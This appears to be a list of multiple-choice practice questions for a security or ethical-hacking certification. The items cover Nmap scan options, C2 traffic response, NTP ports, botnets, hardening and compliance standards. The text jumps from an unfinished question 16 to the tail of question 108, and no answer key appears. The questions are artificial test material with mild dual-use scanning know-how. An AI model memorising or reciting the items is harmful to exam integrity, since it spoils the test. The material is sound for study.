5.  **You are monitoring the network of your organization. You notice that there are huge outbound connections from your Internal Network to External Ips On further investigation, you see that the external IPs are blacklisted. Some connections are accepted, and some are dropped. You find that it is a CnC communication**
    
    **Which of the following solution will you suggest?**
    
    1.  Block the blacklist IP’s at firewall
    2.  Update the latest signatures on your IDS/IPS
    3.  Clean the malware that are trying to communicate with the external blacklist IPs
    4.  Both B and C
6.  **Trinity needs to scan all hosts on a /16 network for TCP port 445 only. What is the fastest way she can accomplish this with Nmap? Stealth is not a concern.** 
    1.  nmap -sn -sF 10.1.0.0/16 445
    2.  nmap -p 445 -n -T4 –open 10.1.0.0/16
    3.  nmap -s 445 -sU -T5 10.1.0.0/16
    4.  nmap -p 445 –max -Pn 10.1.0.0/16
7.  **When tuning security alerts, what is the best approach?** 
    1.  Tune to avoid false positives and false negatives
    2.  Increase false positives decrease false negatives
    3.  Decrease the false positives
    4.  Decrease the false negatives
8.  **Identify the UDP port that Network Time Protocol (NTP) uses as its primary means of communication.** 
    1.  123
    2.  161
    3.  69
    4.  113
9.  Which of the following is an adaptive SQL injection testing technique used to discover coding errors by inputting massive amounts of random data and observing the changes in the output?  
    1.  Function testing
    2.  Dynamic testing
    3.  Static testing
    4.  Fuzzing testing
10.  **Which Nmap option would you use if you were not concerned about being detected and wanted to perform a very fast scan?** 
     1.  –T0
     2.  –T5
     3.  \-O
     4.  \-A
11.  **Which of the following problems can be solved by using Wireshark?** 
     1.  Tracking the version changes of the source code
     2.  Checking creation dates on all webpages on a server
     3.  Resetting the administrator password on multiple systems
     4.  Troubleshooting communication resets between two systems
12.  **After gaining access to the password hashes used to protect access to a web-based application, the knowledge of which cryptographic algorithms would be useful to gain access to the application?** 
     1.  SHA1
     2.  Diffie-Hellman
     3.  RSA
     4.  AES
13.  **A botnet can be managed through which of the following?** 
     1.  IRC
     2.  E-Mail
     3.  LinkedIn and Facebook
     4.  A vulnerable FTP server
14.  **What does the -oX flag do in an Nmap scan?** 
     1.  Perform an express scan
     2.  Output the results in a truncated format to the screen
     3.  Perform an Xmas scan
     4.  Output the results in an XML format to a file
15.  **An attacker uses a communication channel within an operating system that is neither designed nor intended to transfer information. What is the name of the communication channel?** 
     1.  Classified
     2.  Overt
     3.  Encrypted
     4.  Covert
16.  **At a Windows server command prompt, which command could be used to list the running services?** 
     1.  Sc query type= running

      3.  Salting
      4.  Double Hashing
109.  **Nation-state threat actors often discover vulnerabilities and hold on to them until they want to launch a sophisticated attack. The Stuxnet attack was an unprecedented style of attack because it used four types of vulnerability.**
      
      **What is this style of attack called?**
      
      1.  zero-day
      2.  zero-hour
      3.  zero-sum
      4.  no-day
110.  **To reduce the attack surface of a system, administrators should perform which of the following processes to remove unnecessary software, services, and insecure configuration settings?** 
      1.  Harvesting
      2.  Windowing
      3.  Hardening
      4.  Stealthing
111.  **Backing up data is a security must. However, it also has a certain level of risk when mishandled. Which of the following is the greatest threat posed by backups?** 
      1.  A backup is the source of malware or illicit information.
      2.  A backup is incomplete because no verification is performed.
      3.  A backup is unavailable during disaster recovery.
      4.  An unencrypted backup can be misplaced or stolen.
112.  **What network security concept requires multiple layers of security controls to be placed throughout an IT infrastructure to improve the security posture of an organization to defend against malicious attacks or potential vulnerabilities?** 
      1.  Security through obscurity
      2.  Host-based Intrusion Detection System
      3.  Defence-in-depth
      4.  Network-based Intrusion Detection System
113.  **Which type of security feature stops vehicles from crashing through the doors of a building?** 
      1.  Turnstile
      2.  Bollards
      3.  Mantrap
      4.  Receptionist
114.  **Which of the following can the administrator do to verify that a tape backup can be recovered in its entirety?** 
      1.  Restore a random file.
      2.  Perform a full restore.
      3.  Read the first 512 bytes of the tape.
      4.  Read the last 512 bytes of the tape.
115.  **If executives are found liable for not properly protecting their company’s assets and information systems, what type of law would apply in this situation?** 
      1.  Common
      2.  Civil
      3.  International
      4.  Criminal
116.  **Which of the following is a preventive control?** 
      1.  Smart card authentication
      2.  Security policy
      3.  Audit trail
      4.  Continuity of operations plan
117.  **Which of the following business challenges could be solved by using a vulnerability scanner?** 
      1.  Auditors want to discover if all the systems are following a standard naming convention.
      2.  A web server was compromised and management needs to know if any further systems were compromised.
      3.  There is an emergency need to remove administrator access from multiple machines for an employee that quit.
      4.  There is a monthly requirement to test corporate compliance with host application usage and security policies.
118.  **Security and privacy of/on information systems are two entities that enquire lawful regulations. Which of the following regulations defines security and privacy controls for federal information systems and organizations?** 
      1.  NIST SP 800-53
      2.  PCI-DSS
      3.  EU Safe Harbor
      4.  HIPAA
119.  **Which of the following guidelines or standards is associated with the credit card industry?** 
      1.  Control Objectives for Information and Related Technology (COBIT)
      2.  Sarbanes-Oxley Act (SOX)
      3.  Health Insurance Portability and Accountability Act (HIPAA)
      4.  Payment Card Industry Data Security Standards (PCI DSS)
120.  **Which of the following is optimized for confidential communications, such** **as bidirectional voice and video?** 
      1.  RC4
      2.  RC5
      3.  MD4
      4.  MD5
121.  **Which access control mechanism allows for multiple systems to use a central authentication server (CAS) that permits users to authenticate once and gain access to multiple systems?** 
      1.  Role-based Access Control (RBAC)
      2.  Discretionary Access Control (DAC)
      3.  Windows authentication
      4.  Single sign-on
122.  **Passive reconnaissance involves collecting information through which of the following?** 
      1.  Social engineering
      2.  Network traffic sniffing
      3.  Man-in-the-middle attacks
      4.  Publicly accessible sources
123.  **Which of the following is an NMAP script that could help detect HTTP methods such as GET, POST, HEAD, PUT, DELETE, TRACE?** 
      1.  http-git
      2.  http-headers
      3.  http enum
      4.  http-methods
124.  **Which of the following settings enables Nessus to detect when it sends too many packets and the network pipe approaches capacity?** 
      1.  Netstat WMI scan
      2.  Silent Dependencies
      3.  Consider unscanned ports as closed
      4.  Reduce parallel connections on congestion
125.  **Which tier in the N-tier application architecture is responsible for moving and processing data between the tiers?** 
      1.  Data tier
      2.  Presentation tier
      3.  Logic tier
      4.  Application layer
